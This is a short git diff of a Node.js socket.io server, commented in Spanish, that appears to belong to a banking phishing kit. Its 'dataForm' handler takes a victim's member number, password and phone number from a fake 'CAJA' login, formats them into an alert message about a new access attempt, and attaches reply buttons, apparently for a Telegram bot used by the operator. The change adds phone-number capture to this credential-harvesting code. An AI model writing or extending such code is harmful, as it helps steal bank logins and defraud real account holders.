@@ -26,10 +26,10 @@ app.use(bodyParser.json());
 
 io.on('connection', (socket) => {
   // Login principal (campo socio)
-  socket.on('dataForm', ({ socio, contrasena, sessionId }) => {
+  socket.on('dataForm', ({ socio, contrasena, telefono, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}📱 Número telefónico: ${telefono}`;
+    const mensaje = `🔐 Nuevo intento de acceso CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}\n📱 Número telefónico: ${telefono}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
